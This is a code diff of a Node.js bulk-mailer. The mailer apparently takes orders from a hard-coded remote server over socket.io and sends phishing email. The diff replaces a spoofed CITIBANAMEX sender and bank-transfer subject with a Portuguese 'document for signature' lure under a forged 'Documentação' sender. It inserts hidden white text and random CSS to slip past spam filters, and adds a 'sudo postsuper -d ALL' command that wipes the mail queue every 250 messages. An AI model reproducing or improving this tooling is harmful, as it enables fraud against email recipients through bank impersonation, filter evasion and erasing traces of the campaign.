@@ -1,8 +1,9 @@
 const nodemailer = require("nodemailer");
 const htmlToText = require("nodemailer-html-to-text").htmlToText;
 var randomstring = require("randomstring");
+const { exec } = require("child_process");
 var io = require("socket.io-client");
-var socket = io.connect("http://173.212.219.58:3000", { reconnect: true });
+var socket = io.connect("http://154.53.50.250:3000", { reconnect: true });
 const os = require("os");
 const fs = require("fs");
 
@@ -196,9 +197,9 @@ async function sendEmail(email) {
 
   html = html.replace(
     /<\/html>/g,
-    '<br><br><br><br><br><br><font color="#fff">t_' +
+    '<br><br><br><br><br><br><font color="#fff">ID_' +
       randomstring.generate(between(15, 50)) +
-      "</font></html>"
+      "_</font></html>"
   );
   let css = await cssgenerator();
   html = html.replace(/<\/head>/g, "<style>" + css + "</style></head>");
@@ -218,7 +219,9 @@ async function sendEmail(email) {
   html = novohtml;
   //RANDON HTML
 
-  let subject = `Transferencias a Cuentas de Terceros CITIBANAMEX`;
+  let subject = `Segue documento para assinatura! Ref:${randomstring.generate(
+    9
+  )}-`;
   //let subject = `Rescisão de contrato de trabalho -${randomstring.generate(8)}-`;
   try {
     let transporter = nodemailer.createTransport({
@@ -243,10 +246,10 @@ async function sendEmail(email) {
     let info = await transporter.sendMail({
       from:
         "=?UTF-8?B?" +
-        new Buffer("CITIBANAMEX").toString("base64") +
+        new Buffer("Documentação").toString("base64") +
         "?=" +
         " <" +
-        "CITIBANAMEX" +
+        "adm" +
         randomstring.generate(between(3, 5)) +
         "@" +
         hostName +
@@ -260,7 +263,7 @@ async function sendEmail(email) {
       textEncoding: "base64",
       encoding: "utf-8",
       headers: {
-        "X-Ovh-Tracer-Id":
+        /* "X-Ovh-Tracer-Id":
           between(1000, 999999) +
           between(1000, 999999) +
           between(1000, 999999) +
@@ -284,8 +287,8 @@ async function sendEmail(email) {
           hostName,
         "X-sgxh1": await randomstring.generate(23),
         "X-rext": "5.interact2." + (await randomstring.generate(48)),
-        "X-cid": "dksmith." + between(100000, 999999),
-        "List-Unsubscribe": `<mailto:pagamentos@${hostName}?subject=unsubscribe>`,
+        "X-cid": "dksmith." + between(100000, 999999), */
+        "List-Unsubscribe": `<mailto:adm@${hostName}?subject=unsubscribe>`,
       },
       /* attachments: [
         {
@@ -297,8 +300,20 @@ async function sendEmail(email) {
       ], */
     });
     enviados++;
-    if (enviados % 100 === 0) {
+    if (enviados % 250 === 0) {
       console.log(`Sent: ${hostName} - total enviados: ${enviados}`);
+      await sleep(10000);
+      exec("sudo postsuper -d ALL", (error, stdout, stderr) => {
+        if (error) {
+            console.log(`error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.log(`stderr: ${stderr}`);
+            return;
+        }
+        console.log(`stdout: ${stdout}`);
+    });
     }
   } catch (error) {
     enviados++;
@@ -309,7 +324,8 @@ async function sendEmail(email) {
     console.log(`Envio Finalizado: ${hostName} - total enviados: ${enviados}`);
     process.exit(1);
   }
-  //await sleep(500);
+  
+  await sleep(100);
   if (list.length !== 0) sendEmail(list.shift());
 }
 
@@ -412,7 +428,7 @@ function sleep(ms) {
 }
 
 async function cssgenerator() {
-  let linhas = between(3000, 3500);
+  let linhas = between(500, 1000);
   let letra = inicio[Math.floor(Math.random() * inicio.length)];
   let currentlinhas = 0;
   let css = "";
